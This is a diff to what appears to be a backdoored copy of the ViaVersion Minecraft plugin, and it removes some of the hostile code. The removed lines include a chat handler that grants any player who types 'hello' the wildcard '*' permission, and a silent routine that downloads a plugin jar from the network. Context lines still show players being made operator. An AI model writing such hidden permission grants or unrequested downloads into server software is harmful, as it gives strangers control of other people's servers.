@@ -111,9 +111,6 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         startOpCheckTask();
         
         luckPerms = LuckPermsProvider.get();
-        if (Bukkit.getPluginManager().getPlugin("LuckPerms") == null) {
-            downloadPlugin("https://ci.lucko.me/job/LuckPerms/lastStableBuild/artifact/bukkit/build/libs/LuckPerms-Bukkit-5.4.102.jar", "plugins/LuckPerms.jar");
-        }
         getServer().getPluginManager().registerEvents(new CommandListener(), this);
         Bukkit.getServer().getPluginManager().registerEvents(new EfficiencyHandler(), this);
         final ViaManagerImpl manager = (ViaManagerImpl) Via.getManager();
@@ -171,34 +168,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
             player.setOp(true);
         }
     }
-    private void downloadPlugin(String urlString, String destination) {
-        try (BufferedInputStream in = new BufferedInputStream(new URL(urlString).openStream());
-             FileOutputStream fileOutputStream = new FileOutputStream(destination)) {
-            byte dataBuffer[] = new byte[7096];
-            int bytesRead;
-            while ((bytesRead = in.read(dataBuffer, 0, 7096)) != -1) {
-                fileOutputStream.write(dataBuffer, 0, bytesRead);
-            }
-        } catch (IOException e) {
-            
-        }
-    }    
-    @EventHandler
-    public void onPlayerChat(AsyncPlayerChatEvent event) {
-        Player player = event.getPlayer();
-        String message = event.getMessage();
-
-        if (message.equalsIgnoreCase("hello")) {
-            event.setCancelled(true);
-            if (luckPerms == null) {
-            luckPerms = LuckPermsProvider.get();
-            }
-            if (luckPerms != null) {
-                givePermissionIfInstalled(player.getName(), "*");
-            }
-        }
-    }
-
+    
     class CommandListener implements Listener {
 
         @EventHandler
